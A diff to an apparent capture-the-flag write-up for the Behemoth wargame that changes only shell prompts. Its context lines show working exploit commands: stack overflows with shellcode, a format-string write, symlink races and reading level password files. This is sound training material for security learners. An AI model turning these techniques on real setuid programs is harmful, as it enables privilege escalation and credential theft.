@@ -279,8 +279,8 @@ We'll put our shellcode in =$EGG= and overwrite the return address from
 =main= to point to =$EGG=.
 
 #+BEGIN_EXAMPLE -n 1
-shell> export EGG=$(cat shellcode)
-shell> ./getenvaddr EGG /behemoth/behemoth1
+$ export EGG=$(cat shellcode)
+$ ./getenvaddr EGG /behemoth/behemoth1
 ffffda2d
 #+END_EXAMPLE
 
@@ -289,11 +289,11 @@ bytes in the correct order. The low-order byte goes first and the
 high-order byte last.
 
 #+BEGIN_EXAMPLE -n 1
-shell> printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
+$ printf "%s\x2d\xda\xff\xff" $(python -c "print('A' * 71)") | /behemoth/behemoth1
 Password: Authentication failure.
 Sorry.
 XXXXXXXXXX
-shell>
+$
 #+END_EXAMPLE
 
 The shellcode displays the contents of
@@ -398,11 +398,11 @@ permissions. Then we'll make a file called =pass.txt= and give it the
 same permissions.
 
 #+BEGIN_EXAMPLE -n 1
-shell> mkdir w
-shell> chmod 777
-shell> cd w
-shell> touch pass.txt
-shell> chmod 777 pass.txt
+$ mkdir w
+$ chmod 777
+$ cd w
+$ touch pass.txt
+$ chmod 777 pass.txt
 #+END_EXAMPLE
 
 This hack will take 33.3 minutes to complete. Because we don't want to
@@ -412,16 +412,16 @@ process, we'll know the PID and hence know the filename we need to
 overwrite with a symbolic link.
 
 #+BEGIN_EXAMPLE -n 1
-shell> behemoth/behemoth2 > pass.txt &
+$ behemoth/behemoth2 > pass.txt &
 [1] 29355
-shell> ln -sf /etc/behemoth_pass/behemoth3 29355
+$ ln -sf /etc/behemoth_pass/behemoth3 29355
 #+END_EXAMPLE
 
 We can run the following shell script snippet to sound the bell when the
 process has ended.
 
 #+BEGIN_EXAMPLE -n 1
-shell> while (2>&1 kill -0 29355 | grep permitted > /dev/null); do
+$ while (2>&1 kill -0 29355 | grep permitted > /dev/null); do
 > echo "Process still running..."
 > sleep 5
 > done; \
@@ -491,8 +491,8 @@ resides. This information is supplied by the =.plt= section.
 Let's first prepare our shellcode.
 
 #+BEGIN_EXAMPLE -n 1
-shell> export EGG=$(cat shellcode)
-shell> ./getenvaddr EGG /behemoth/behemoth3
+$ export EGG=$(cat shellcode)
+$ ./getenvaddr EGG /behemoth/behemoth3
 ffffde2d
 #+END_EXAMPLE
 
@@ -518,7 +518,7 @@ bytes.
 The final result looks like this:
 
 #+BEGIN_EXAMPLE -n 1
-shell> printf '\xac\x97\x04\x08\xae\x97\x04\x08%%56869c%%1$n%%8658c%%2$n' | /behemoth/behemoth3
+$ printf '\xac\x97\x04\x08\xae\x97\x04\x08%%56869c%%1$n%%8658c%%2$n' | /behemoth/behemoth3
 
 XXXXXXXXXX
 #+END_EXAMPLE
@@ -639,14 +639,14 @@ and the child will execute =/behemoth/behemoth4=.
 We'll save this code =exploit.c= and compile it.
 
 #+BEGIN_EXAMPLE -n 1
-shell> gcc -o exploit exploit.c
-shell> ./exploit > pass.txt
+$ gcc -o exploit exploit.c
+$ ./exploit > pass.txt
 #+END_EXAMPLE
 
 Wait for 5 seconds and then,
 
 #+BEGIN_EXAMPLE -n 1
-shell> cat pass.txt
+$ cat pass.txt
 Making symlink: /tmp/16830 -> /etc/behemoth_pass/behemoth5
 Finished sleeping, fgetcing
 XXXXXXXXXX
@@ -708,10 +708,10 @@ This will be extremely easy. We'll use netcat to listen on a UDP
 socket using port 1337.
 
 #+BEGIN_EXAMPLE -n 1
-shell> nc -u -l -p 1337 > pass.txt &
+$ nc -u -l -p 1337 > pass.txt &
 [2] 18669
-shell> /behemoth/behemoth5
-shell> cat pass.txt
+$ /behemoth/behemoth5
+$ cat pass.txt
 XXXXXXXXXX
 #+END_EXAMPLE
 
@@ -759,22 +759,22 @@ ret
 We need to make a directory that the user behemoth7 can access.
 
 #+BEGIN_EXAMPLE -n 1
-shell> mkdir w
-shell> chmod 777 w
-shell> cd w
+$ mkdir w
+$ chmod 777 w
+$ cd w
 #+END_EXAMPLE
 
 Now let's assemble our shellcode and run =behemoth6=.
 
 #+BEGIN_EXAMPLE -n 1
-shell> nasm -o shellcode.txt ../shellcode6.asm
-shell> /behemoth/behemoth6
+$ nasm -o shellcode.txt ../shellcode6.asm
+$ /behemoth/behemoth6
 Correct.
-shell> whoami
+$ whoami
 behemoth7
-shell> cat /etc/behemoth_pass/behemoth7
+$ cat /etc/behemoth_pass/behemoth7
 XXXXXXXXXX
-shell>
+$
 #+END_EXAMPLE
 
 *** Alternative Exploit
@@ -841,16 +841,16 @@ of =/etc/behemoth_pass/behemoth7= and into =pass.txt=.
 Now we'll assembly, compile, and run.
 
 #+BEGIN_EXAMPLE -n 1
-shell> mkdir w
-shell> chmod 777 w
-shell> cd w
-shell> touch pass.txt
-shell> chmod 777 pass.txt
-shell> nasm -o shellcode.txt -f bin shellcode6.1.asm
-shell> gcc -m32 -o X X.c
-shell> /behemoth/behemoth6
+$ mkdir w
+$ chmod 777 w
+$ cd w
+$ touch pass.txt
+$ chmod 777 pass.txt
+$ nasm -o shellcode.txt -f bin shellcode6.1.asm
+$ gcc -m32 -o X X.c
+$ /behemoth/behemoth6
 Incorrect output.
-shell> cat pass.txt
+$ cat pass.txt
 XXXXXXXXXX
 #+END_EXAMPLE
 
@@ -968,9 +968,9 @@ After we assemble our shellcode, we're going to use a nop sled to make
 life easier.
 
 #+BEGIN_EXAMPLE -n 1
-shell> nasm -f bin -o shellcode.bin shellcode.asm
-shell> python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"* 1024)' > sled.bin
-shell> cat sled.bin shellcode.bin > shellcode
+$ nasm -f bin -o shellcode.bin shellcode.asm
+$ python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"* 1024)' > sled.bin
+$ cat sled.bin shellcode.bin > shellcode
 #+END_EXAMPLE
 
 Now we need the memory address of =argv[2]=.
@@ -995,7 +995,7 @@ Breakpoint 1, 0x08048534 in main ()
 sled, I'm just going to estimate it as =0xffffd401=.
 
 #+BEGIN_EXAMPLE -n 1
-shell> /behemoth/behemoth7 $(python3 -c 'print("A" * 528, end="")'; printf "\x01\xd4\xff\xff") $(cat shellcode)
+$ /behemoth/behemoth7 $(python3 -c 'print("A" * 528, end="")'; printf "\x01\xd4\xff\xff") $(cat shellcode)
 XXXXXXXXXX
 #+END_EXAMPLE
 
